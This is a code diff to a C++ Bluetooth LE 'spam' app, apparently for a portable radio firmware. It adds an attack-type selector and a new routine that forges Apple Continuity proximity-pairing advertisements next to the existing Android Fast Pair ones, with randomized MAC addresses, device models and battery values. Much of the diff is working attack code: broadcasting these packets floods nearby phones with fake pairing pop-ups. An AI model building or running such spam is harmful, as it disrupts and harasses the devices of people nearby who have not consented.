@@ -71,7 +71,9 @@ BLESpamView::BLESpamView(NavigationView& nav)
                   &field_frequency,
                   &tx_view,
                   &chk_randdev,
+                  &options_atkmode,
                   &console});
+
     button_startstop.on_select = [this](Button&) {
         if (is_running) {
             is_running = false;
@@ -83,12 +85,20 @@ BLESpamView::BLESpamView(NavigationView& nav)
             button_startstop.set_text("Stop");
         }
     };
+    chk_randdev.set_value(true);
     field_frequency.set_value(get_freq_by_channel_number(channel_number));
     chk_randdev.on_select = [this](Checkbox&, bool v) {
         randomDev = v;
     };
-    createFastPairPacket();  // only at startup, and if the checkbox is ticked
-    //
+    options_atkmode.on_change = [this](size_t, int32_t i) {
+        attackType = (ATK_TYPE)i;
+        changePacket(true);
+    };
+    console.writeln("Based on work of:");
+    console.writeln("@Willy-JL, @ECTO-1A,");
+    console.writeln("@Spooks4576");
+
+    changePacket(true);  // init
 }
 
 void BLESpamView::stop() {
@@ -123,6 +133,52 @@ void BLESpamView::randomizeMac() {
     mac[12] = '\0';  // Null-terminate the string
 }
 
+void BLESpamView::furi_hal_random_fill_buf(uint8_t* buf, uint32_t len) {
+    for (uint32_t i = 0; i < len; i += 4) {
+        const uint32_t random_val = rand();
+        uint8_t len_cur = ((i + 4) < len) ? (4) : (len - i);
+        memcpy(&buf[i], &random_val, len_cur);
+    }
+}
+
+void BLESpamView::createIosPacket() {
+    // ContinuityTypeProximityPair, len: 6+25
+    uint8_t size = 6 + 25;
+    uint8_t type = 0;  // ContinuityTypeProximityPair
+    uint8_t* packet = (uint8_t*)malloc(size);
+    uint8_t i = 0;
+
+    packet[i++] = size - 1;    // Size
+    packet[i++] = 0xFF;        // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C;        // Company ID (Apple, Inc.)
+    packet[i++] = 0x00;        // ...
+    packet[i++] = type;        // Continuity Type
+    packet[i] = size - i - 1;  // Continuity Size
+    i++;
+    uint8_t model_index = rand() % iosModels_count;
+    uint16_t model = iosModels[model_index].value;
+    uint8_t color = rand() % iosModels[model_index].count;
+    uint8_t prefix = 0x07;
+    if (model == 0x0055 || model == 0x0030)
+        prefix = 0x05;
+    else
+        prefix = 0x01;
+    packet[i++] = prefix;                                // Prefix (paired 0x01 new 0x07 airtag 0x05)
+    packet[i++] = (model >> 0x08) & 0xFF;                // Device Model
+    packet[i++] = (model >> 0x00) & 0xFF;                // ...
+    packet[i++] = 0x55;                                  // Status
+    packet[i++] = ((rand() % 10) << 4) + (rand() % 10);  // Buds Battery Level
+    packet[i++] = ((rand() % 8) << 4) + (rand() % 10);   // Charing Status and Battery Case Level
+    packet[i++] = (rand() % 256);                        // Lid Open Counter
+    packet[i++] = color;                                 // Device Color
+    packet[i++] = 0x00;
+    furi_hal_random_fill_buf(&packet[i], 16);  // Encrypted Payload
+    i += 16;
+    std::string res = to_string_hex_array(packet, size);
+    memset(advertisementData, 0, sizeof(advertisementData));
+    std::copy(res.begin(), res.end(), advertisementData);
+    free(packet);
+}
 void BLESpamView::createFastPairPacket() {
     uint32_t model;
     model = fastpairModels[rand() % fastpairModels_count].value;
@@ -136,20 +192,27 @@ void BLESpamView::createFastPairPacket() {
     advertisementData[19] = uint_to_char((model >> 8) & 0x0F, 16);
     advertisementData[20] = uint_to_char((model >> 4) & 0x0F, 16);
     advertisementData[21] = uint_to_char((model >> 0) & 0x0F, 16);
-    // advertisementData[8] = (model >> 0x10) & 0xFF;   // Device Model
-    // advertisementData[9] = (model >> 0x08) & 0xFF;   // ...
-    // advertisementData[10] = (model >> 0x00) & 0xFF;  // ...
-    console.writeln(advertisementData);
 }
 
-void BLESpamView::changePacket() {
+void BLESpamView::changePacket(bool forced = false) {
     counter++;
-    if (counter >= 5) {
+    if (counter >= 5 || forced) {
         // really change packet and mac
         counter = 0;
         randomizeMac();
         randomChn();
-        if (randomDev) createFastPairPacket();
+        if (randomDev || forced) {
+            switch (attackType) {
+                case ATK_IOS:
+                    createIosPacket();
+                    break;
+                default:
+                case ATK_ANDROID:
+                    createFastPairPacket();
+                    break;
+            }
+        }
+        console.writeln(advertisementData);
     }
 }
 // called each 1/60th of second, so 6 = 100ms
@@ -162,16 +225,15 @@ void BLESpamView::on_timer() {
         }
     }
 }
+
+/*
 void BLESpamView::on_tx_progress(const bool done) {
     if (done) {
         if (is_running) {
-            /*            if ((packet_counter % 10) == 0) {
-                text_packets_sent.set(to_string_dec_uint(packet_counter));
-            }
-            */
         }
     }
 }
+*/
 
 BLESpamView::~BLESpamView() {
     stop();
